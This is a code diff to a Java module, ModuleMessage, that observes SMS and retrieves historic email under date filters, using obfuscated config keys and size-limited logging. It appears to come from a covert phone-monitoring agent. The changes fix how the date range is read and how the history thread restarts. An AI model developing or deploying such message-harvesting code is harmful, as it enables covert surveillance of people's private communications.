@@ -82,8 +82,8 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
     Thread historyThread = null;
     private boolean mailHistory;
 
-    private Date mailFrom;
-    private Date mailTo;
+    private Date mailFrom=null;
+    private Date mailTo=null;
 
     public static String getStaticType() {
         //18.0=messages
@@ -130,10 +130,13 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                     .getChild(Messages.getString("18.3")); //$NON-NLS-1$
             if (mailEnabled) {
                 int maxSizeToLog = 4096;
+                status.firstMessageRun = true;
                 mailHistory = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
                 if (mailHistory) {
                     mailFrom = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
-                    mailTo = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
+                    if (mailFilter.has(Messages.getString("18.6"))) {
+                        mailTo = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
+                    }
                     filterEmailCollect = new Filter(mailHistory, mailFrom,
                             mailTo, maxSizeToLog, maxSizeToLog);
                 }
@@ -183,15 +186,13 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                 //#endif
                 status.firstMessageRun = false;
 
-                if (mailEnabled) {
+                
                     if (historyThread != null) {
                         //#ifdef DEBUG
                         debug.trace("actualRun: stopping historyThread"); //$NON-NLS-1$
                         //#endif
 
-                        //#ifdef HISTORY_MAIL
                         mailListener.stopHistory();
-                        //#endif
 
                         try {
                             historyThread.join();
@@ -203,7 +204,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                             debug.error("actualRun: " + e); //$NON-NLS-1$
                             //#endif
                         }
-                    }
+                    
                     historyThread = new Thread(new Runnable() {
                         public void run() {
                             mailListener.retrieveHistoricMails();
@@ -213,7 +214,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
                 }
             }
         }
-        status.firstMessageRun = true;
+        
     }
 
     /*
